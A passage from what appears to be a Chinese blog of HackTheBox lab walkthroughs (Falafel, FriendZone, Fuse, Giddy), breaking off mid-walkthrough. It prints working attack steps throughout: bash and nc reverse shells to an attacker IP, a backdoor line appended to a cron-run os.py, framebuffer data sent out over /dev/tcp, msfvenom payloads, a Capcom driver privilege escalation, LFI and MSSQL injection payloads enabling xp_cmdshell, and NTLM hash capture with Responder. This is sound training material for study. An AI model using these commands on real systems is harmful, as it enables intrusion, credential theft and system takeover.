<h3 id="长文件名截断上传getshell"><a href="#长文件名截断上传getshell" class="headerlink" title="长文件名截断上传getshell"></a>长文件名截断上传getshell</h3><p>正常上传一个处理过mime的图片过去</p>
<p><img src="/images/Falafel/14.jpg" alt="14"></p>
<p>访问发现无法运行</p>
<p><img src="/images/Falafel/15.jpg" alt="15"></p>
<p>在另一个页面得到了提示，提示了文件名的长度，想到了文件长度截断</p>
<p>我生成的文件名: <code>255-8个a</code>+<code>.php.jpg</code>（我的linux最长文件名长度为255)</p>
<p><img src="/images/Falafel/16.jpg" alt="16"></p>
<p>得到了有用的信息，首先发出警告文件名过长，但上传还是成功了，而且给出了保存的文件名，通过保存的文件名，我们就可以知道对方文件名的长度限制，计算出我们文件名，使其上传之后能够截断<code>.php.jpg</code>的<code>.jpg</code>，从而执行php代码</p>
<p><img src="/images/Falafel/17.jpg" alt="17"></p>
<p>发现对方文件名总长为237</p>
<p>所以我们的文件名应该为:<code>237-4个a</code>+<code>.php.jpg</code>，这样总长为241，截断末尾4字节(.jpg)</p>
<p><img src="/images/Falafel/18.jpg" alt="18"></p>
<p>看样子保存的格式的确为php了</p>
<p><img src="/images/Falafel/19.jpg" alt="19"></p>
<p>一句话木马执行成功</p>
<p>反弹shell payload进行url编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.100&#x2F;4444 0&gt;&amp;1&#39;</span><br><span class="line">%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%31%30%30%2f%34%34%34%34%20%30%3e%26%31%27</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/20.jpg" alt="20"></p>
<p>成功getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现mysql连接文件</p>
<p><img src="/images/Falafel/21.jpg" alt="21"></p>
<p>成功复用密码切换账号</p>
<p><img src="/images/Falafel/22.jpg" alt="22"></p>
<h3 id="video"><a href="#video" class="headerlink" title="video"></a>video</h3><p>还发现用户moshe在video组<br>有关video提权，可以在这里看到:<a href="https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html">链接</a></p>
<p><img src="/images/Falafel/24.jpg" alt="24"></p>
<p>大概提权思路是，输出图像会存储在帧缓冲区，fb0表示第一帧，fb1表示第二帧，以此类推，我们可以用一个perl脚本，将其还原成图片</p>
<p>先把这个文件给传过来，改名为fb.raw</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999 &gt; fb.raw</span><br><span class="line">cat &#x2F;dev&#x2F;fb0 &gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.100&#x2F;9999</span><br></pre></td></tr></table></figure>

<p>接着去读取屏幕的长和宽</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;sys&#x2F;class&#x2F;graphics&#x2F;fb0&#x2F;virtual_size </span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/25.jpg" alt="25"></p>
<p>源码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl -w</span><br><span class="line"></span><br><span class="line">$w &#x3D; shift || 240;</span><br><span class="line">$h &#x3D; shift || 320;</span><br><span class="line">$pixels &#x3D; $w * $h;</span><br><span class="line"></span><br><span class="line">open OUT, &quot;|pnmtopng&quot; or die &quot;Can&#39;t pipe pnmtopng: $!\n&quot;;</span><br><span class="line"></span><br><span class="line">printf OUT &quot;P6%d %d\n255\n&quot;, $w, $h;</span><br><span class="line"></span><br><span class="line">while ((read STDIN, $raw, 2) and $pixels--) &#123;</span><br><span class="line">   $short &#x3D; unpack(&#39;S&#39;, $raw);</span><br><span class="line">   print OUT pack(&quot;C3&quot;,</span><br><span class="line">      ($short &amp; 0xf800) &gt;&gt; 8,</span><br><span class="line">      ($short &amp; 0x7e0) &gt;&gt; 3,</span><br><span class="line">      ($short &amp; 0x1f) &lt;&lt; 3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close OUT;</span><br></pre></td></tr></table></figure>

<p>转换图片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install pnmtopng</span><br><span class="line">perl rock.pl 1176 885 &lt; fb.raw &gt; fb0.png</span><br></pre></td></tr></table></figure>

<p>或者可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gnup</span><br></pre></td></tr></table></figure>

<p>打开选项，选择</p>
<p><img src="/images/Falafel/26.jpg" alt="26"></p>
<p>之后就可以读到密码</p>
<p><img src="/images/Falafel/27.jpg" alt="27"></p>
<p><code>MoshePlzStopHackingMe!</code></p>
<p>成功切换到用户<code>yossi</code></p>
<p><img src="/images/Falafel/28.jpg" alt="28"></p>
<p>我们发现<code>yossi</code>在用户组<code>disk</code>中</p>
<p>disk组的权限约等于root，因为它拥有对dev整个读和写的权限</p>
<p><img src="/images/Falafel/30.jpg" alt="30"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debugfs &#x2F;dev&#x2F;sda1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/29.jpg" alt="29"></p>
<p>我们甚至能直接读root.txt<br>我们可以读取root的私钥(<code>/root/.ssh/id_rsa</code>)</p>
<p><img src="/images/Falafel/31.jpg" alt="31"></p>
<p>成功获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:FriendZone</title>
    <url>/2020/06/27/HTB-FriendZone/</url>
    <content><![CDATA[<h1 id="FriendZone"><a href="#FriendZone" class="headerlink" title="FriendZone"></a>FriendZone</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FriendZone/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试21端口匿名登录，失败</p>
<p>进行smb枚举</p>
<p>目录枚举</p>
<p><img src="/images/FriendZone/2.jpg" alt="2"></p>
<p>nmap枚举出了路径</p>
<p><img src="/images/FriendZone/14.jpg" alt="14"></p>
<p>目录权限枚举<br>(这里使用smbmap遇到Authentication error ，需要跟新impacket)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade impacket</span><br><span class="line">smbmap -H 10.10.10.123</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/3.jpg" alt="3"></p>
<p>对目录树进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.123 -R --depth 5</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/4.jpg" alt="4"></p>
<p>发现了creds.txt，看看那是什么</p>
<p><img src="/images/FriendZone/5.jpg" alt="5"></p>
<p>发现了账号密码</p>
<p>访问web服务</p>
<p><img src="/images/FriendZone/6.jpg" alt="6"></p>
<p>发现了域名，想到之前的53端口DNS服务，我们应该配置host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.123 		friendzoneportal.red friendzone.red</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/7.jpg" alt="7"></p>
<p>进行区域传输</p>
<p><img src="/images/FriendZone/8.jpg" alt="8"></p>
<p>发现了更多子域，全部添加到hosts</p>
<p><img src="/images/FriendZone/9.jpg" alt="9"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>登录带有admin关键字的网站</p>
<p>登录错了</p>
<p><img src="/images/FriendZone/10.jpg" alt="10"></p>
<p>登录成功</p>
<p><img src="/images/FriendZone/11.jpg" alt="11"></p>
<p>跟着提示</p>
<p><img src="/images/FriendZone/12.jpg" alt="12"></p>
<p>看样子是文件包含，尝试利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对image 尝试 &#x2F;etc&#x2F;passwd 和00截断  都没有用</span><br><span class="line">对pagename 尝试 &#x2F;etc&#x2F;passwd 00截断 也没有用</span><br></pre></td></tr></table></figure>

<p>之后尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard.php</span><br></pre></td></tr></table></figure>

<p>失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard</span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="/images/FriendZone/13.jpg" alt="13"></p>
<p>看样子它的包含会添加.php后缀，而且无法截断</p>
<p>我们已经满足了getshell的条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb目录Development允许写入</span><br><span class="line">nmap扫出了上传的路径</span><br><span class="line">本地文件包含执行reverse_shell.php</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;Development&#x2F;evil</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/16.jpg" alt="16"></p>
<p>getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个提权特别隐蔽…</p>
<p>发现os.py具有W权限</p>
<p><img src="/images/FriendZone/17.jpg" alt="17"></p>
<p>发现cronjobs</p>
<p><img src="/images/FriendZone/18.jpg" alt="18"></p>
<p>调用了os库</p>
<p><img src="/images/FriendZone/19.jpg" alt="19"></p>
<p>直接给os加一行，因为还要调用os.system…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;system(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 5555 &gt;&#x2F;tmp&#x2F;f&#39;)&quot; &gt;&gt; os.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Fuse</title>
    <url>/2020/10/16/HTB-Fuse/</url>
    <content><![CDATA[<h1 id="Fuse"><a href="#Fuse" class="headerlink" title="Fuse"></a>Fuse</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53&#x2F;tcp    open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    bind</span><br><span class="line">80&#x2F;tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">88&#x2F;tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-10-15 17:19:35Z)</span><br><span class="line">135&#x2F;tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)</span><br><span class="line">464&#x2F;tcp   open  kpasswd5?</span><br><span class="line">593&#x2F;tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp   open  tcpwrapped</span><br><span class="line">3268&#x2F;tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp  open  tcpwrapped</span><br><span class="line">5985&#x2F;tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389&#x2F;tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">49666&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49667&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49675&#x2F;tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49676&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49680&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49698&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49754&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;10&#x2F;15%Time&#x3D;5F888131%P&#x3D;x86_64-pc-linux-gnu%r(DNS</span><br><span class="line">SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version</span><br><span class="line">SF:\x04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">Service Info: Host: FUSE; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h34m51s, deviation: 4h02m31s, median: 14m49s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Fuse</span><br><span class="line">|   NetBIOS computer name: FUSE\x00</span><br><span class="line">|   Domain name: fabricorp.local</span><br><span class="line">|   Forest name: fabricorp.local</span><br><span class="line">|   FQDN: Fuse.fabricorp.local</span><br><span class="line">|_  System time: 2020-10-15T10:21:57-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-10-15T17:21:55</span><br><span class="line">|_  start_date: 2020-10-15T16:14:26</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现了常规的http、SMB服务，发现了winrm服务(5895端口)</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80端口</p>
<p><img src="/images/Fuse/1.png" alt="1"></p>
<p>发现跳转，添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.193    fuse.fabricorp.local</span><br></pre></td></tr></table></figure>

<p>SMB不允许匿名访问</p>
<p>然后就有点迷了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>这里入口好隐蔽…</p>
<p>手动检查80端口，发现了一些CSV文件，里面存有用户名</p>
<p><img src="/images/Fuse/2.png" alt="2"></p>
<p>接着使用cewl针对当前页面生成特殊字典，当作密码</p>
<p>使用msf的smb爆破功能</p>
<p><img src="/images/Fuse/3.png" alt="3"></p>
<p>这样就能获得第一个凭据了<code>tlavel/Fabricorp01</code></p>
<p>尝试枚举smb</p>
<p><img src="/images/Fuse/4.png" alt="4"></p>
<p>提示NT_STATUS_PASSWORD_MUST_CHANGE</p>
<p>这里需要通过使用<code>smbpasswd</code>来远程修改密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbpasswd -r 10.10.10.193 -U tlavel</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/5.png" alt="5"></p>
<p>修改成功后再次枚举，这样就成功了</p>
<p><img src="/images/Fuse/6.png" alt="6"></p>
<p>没有什么有意思的文件，尝试使用rpcclient进行枚举(samba的另一个套件)<br>命令参考<a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~#rpcclient -U FABRICORP\\tlavel 10.10.10.193</span><br><span class="line">Enter FABRICORP\tlavel&#39;s password: </span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[svc-print] rid:[0x450]</span><br><span class="line">user:[bnielson] rid:[0x451]</span><br><span class="line">user:[sthompson] rid:[0x641]</span><br><span class="line">user:[tlavel] rid:[0x642]</span><br><span class="line">user:[pmerton] rid:[0x643]</span><br><span class="line">user:[svc-scan] rid:[0x645]</span><br><span class="line">user:[bhult] rid:[0x1bbd]</span><br><span class="line">user:[dandrews] rid:[0x1bbe]</span><br><span class="line">user:[mberbatov] rid:[0x1db1]</span><br><span class="line">user:[astein] rid:[0x1db2]</span><br><span class="line">user:[dmuir] rid:[0x1db3]</span><br><span class="line">rpcclient $&gt; enumprivs</span><br><span class="line">found 35 privileges</span><br><span class="line"></span><br><span class="line">SeCreateTokenPrivilege          0:2 (0x0:0x2)</span><br><span class="line">SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)</span><br><span class="line">SeLockMemoryPrivilege           0:4 (0x0:0x4)</span><br><span class="line">SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)</span><br><span class="line">SeMachineAccountPrivilege               0:6 (0x0:0x6)</span><br><span class="line">SeTcbPrivilege          0:7 (0x0:0x7)</span><br><span class="line">SeSecurityPrivilege             0:8 (0x0:0x8)</span><br><span class="line">SeTakeOwnershipPrivilege                0:9 (0x0:0x9)</span><br><span class="line">SeLoadDriverPrivilege           0:10 (0x0:0xa)</span><br><span class="line">SeSystemProfilePrivilege                0:11 (0x0:0xb)</span><br><span class="line">SeSystemtimePrivilege           0:12 (0x0:0xc)</span><br><span class="line">SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)</span><br><span class="line">SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)</span><br><span class="line">SeCreatePagefilePrivilege               0:15 (0x0:0xf)</span><br><span class="line">SeCreatePermanentPrivilege              0:16 (0x0:0x10)</span><br><span class="line">SeBackupPrivilege               0:17 (0x0:0x11)</span><br><span class="line">SeRestorePrivilege              0:18 (0x0:0x12)</span><br><span class="line">SeShutdownPrivilege             0:19 (0x0:0x13)</span><br><span class="line">SeDebugPrivilege                0:20 (0x0:0x14)</span><br><span class="line">SeAuditPrivilege                0:21 (0x0:0x15)</span><br><span class="line">SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)</span><br><span class="line">SeChangeNotifyPrivilege                 0:23 (0x0:0x17)</span><br><span class="line">SeRemoteShutdownPrivilege               0:24 (0x0:0x18)</span><br><span class="line">SeUndockPrivilege               0:25 (0x0:0x19)</span><br><span class="line">SeSyncAgentPrivilege            0:26 (0x0:0x1a)</span><br><span class="line">SeEnableDelegationPrivilege             0:27 (0x0:0x1b)</span><br><span class="line">SeManageVolumePrivilege                 0:28 (0x0:0x1c)</span><br><span class="line">SeImpersonatePrivilege          0:29 (0x0:0x1d)</span><br><span class="line">SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)</span><br><span class="line">SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)</span><br><span class="line">SeRelabelPrivilege              0:32 (0x0:0x20)</span><br><span class="line">SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)</span><br><span class="line">SeTimeZonePrivilege             0:34 (0x0:0x22)</span><br><span class="line">SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)</span><br><span class="line">rpcclient $&gt; enumprinters</span><br><span class="line">        flags:[0x800000]</span><br><span class="line">        name:[\\10.10.10.193\HP-MFT01]</span><br><span class="line">        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]</span><br><span class="line">        comment:[]</span><br><span class="line"></span><br><span class="line">rpcclient $&gt;</span><br></pre></td></tr></table></figure>

<p>因为之前页面发现了疑似惠普打印机，重点关注一下打印机，疑似发现了密码<code>$fab@s3Rv1ce$1</code>，并且也枚举出了一堆用户名<br>使用这一堆用户名和密码，使用msf，针对winrm进行爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; set PASSWORD &#39;$fab@s3Rv1ce$1&#39;                                                                </span><br><span class="line">PASSWORD &#x3D;&gt; $fab@s3Rv1ce$1                                                                    </span><br><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; set USER_FILE &#x2F;root&#x2F;Desktop&#x2F;users.txt                                                                                  </span><br><span class="line">USER_FILE &#x3D;&gt; users                                                                                            </span><br><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; set RHOSTS 10.10.10.193                                                                                       </span><br><span class="line">RHOSTS &#x3D;&gt; 10.10.10.193                                                                                                                         </span><br><span class="line">msf5 auxiliary(scanner&#x2F;winrm&#x2F;winrm_login) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 10.10.10.193:5985 - Login Successful: WORKSTATION\svc-print:$fab@s3Rv1ce$1</span><br></pre></td></tr></table></figure>

<p>这样，我们就可以利用这个凭据去进行连接，这里使用<code>evil-winrm</code>，使用方法:<a href="https://www.freebuf.com/sectool/210479.html">https://www.freebuf.com/sectool/210479.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem install evil-winrm</span><br><span class="line">evil-winrm -u svc-print -p &#39;$fab@s3Rv1ce$1&#39; -i 10.10.10.193</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/7.png" alt="7"></p>
<p>这样就得到了初始shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Fuse/8.png" alt="8"></p>
<p>发现了SeLoadDriverPrivilege权限，可以滥用这个服务进行提权</p>
<p>英文:<a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/">https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</a><br>中文翻译:<a href="https://www.anquanke.com/post/id/148227?from=singlemessage">https://www.anquanke.com/post/id/148227?from=singlemessage</a></p>
<p>接下来开始提权，首先需要准备一些文件</p>
<p>一个非分段式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.16.6 LPORT&#x3D;443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>编译eoploaddriver.cpp</p>
<p><a href="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp">https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp</a></p>
<p>下载Capcom.sys</p>
<p><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a></p>
<p>修改并编译ExploitCapcom.cpp</p>
<p><a href="https://github.com/tandasat/ExploitCapcom">https://github.com/tandasat/ExploitCapcom</a></p>
<p>修改第292行，改成反弹shell的路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TCHAR CommandLine[] &#x3D; TEXT(&quot;C:\\temp\\shell.exe&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/10.png" alt="10"></p>
<p>一共四个文件，传输过去，放在同一目录下</p>
<p><img src="/images/Fuse/9.png" alt="9"></p>
<p>本地监听端口，执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys</span><br><span class="line">.\ExploitCapcom.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Fuse/11.png" alt="11"></p>
<p>这样就可以得到权限提升</p>
<p><img src="/images/Fuse/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Giddy</title>
    <url>/2020/10/26/HTB-Giddy/</url>
    <content><![CDATA[<h1 id="Giddy"><a href="#Giddy" class="headerlink" title="Giddy"></a>Giddy</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Giddy/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查80和443端口，发现它们显示同样的页面，进行目录枚举</p>
<p><img src="/images/Giddy/4.png" alt="4"></p>
<p><code>/Remote/</code>是<code>Windows PowerShell Web Access</code>，需要登录凭据</p>
<p><img src="/images/Giddy/2.png" alt="2"></p>
<p><code>/mvc/</code>是<code>My ASP.NET Application</code>，内容看起来像博客</p>
<p><img src="/images/Giddy/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索处发现sql注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/6.png" alt="6"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;-- -</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/7.png" alt="7"></p>
<p>应该是mssql注入，尝试一些payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; (select convert(int,@@version)) &#39;		报错注入失败</span><br><span class="line">a&#39;;WAITFOR DELAY &#39;0:0:5&#39;--				堆叠注入成功</span><br><span class="line"></span><br><span class="line">a&#39;;slect &#39;&#39; if (select user) &#x3D; &#39;dbo&#39; WAITFOR DELAY &#39;0:0:5&#39;--</span><br></pre></td></tr></table></figure>

<p>sqlmap也ok了</p>
<p><img src="/images/Giddy/8.png" alt="8"></p>
<p>页面的CSRFtoken没有阻止注入，但是sqlmap竟然没有识别出对方的指纹，不过影响不大，后面不用它了</p>
<p>尝试执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;;EXEC sp_configure &quot;show advanced options&quot;,1--</span><br><span class="line">a&#39;;RECONFIGURE--</span><br><span class="line">a&#39;;RECONFIGURE;EXEC sp_configure &quot;xp_cmdshell&quot;,1--</span><br><span class="line">a&#39;;RECONFIGURE--</span><br><span class="line">a&#39;;EXEC xp_cmdshell &#39;ping -n 3 10.10.16.98&#39;--</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -n -i tun0 icmp</span><br></pre></td></tr></table></figure>

<p>不过没有捕获到流量，看来RCE没有生效</p>
<p>检查权限发现，下面语句执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; if (select user) !&#x3D; &#39;dbo&#39; waitfor delay &#39;0:0:5&#39;--</span><br><span class="line">&#39; if (select user) !&#x3D; &#39;sa&#39; waitfor delay &#39;0:0:5&#39;--</span><br></pre></td></tr></table></figure>

<p>看起来不是sa权限，尝试<code>dir_tree</code>来进行smb连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbserver.py -smb2support a &#x2F;root&#x2F;Desktop&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; EXEC master.sys.xp_dirtree &#39;\\10.10.16.98\a&#39;--</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/9.png" alt="9"></p>
<p>之后可以是<code>responder</code>进行攻击，它会回答发出的LLMNR和NBT-NS查询，诱使受害者主机提供Net-NTLM哈希</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>

<p>之后重发一下注入请求，得到对方的NTLMv2哈希，用户名为Stacy，主机名GIDDY</p>
<p><img src="/images/Giddy/10.png" alt="10"></p>
<p>把Sta开始的内容全部复制，NTLMv2会使用用户名和主机名来进行加盐加密</p>
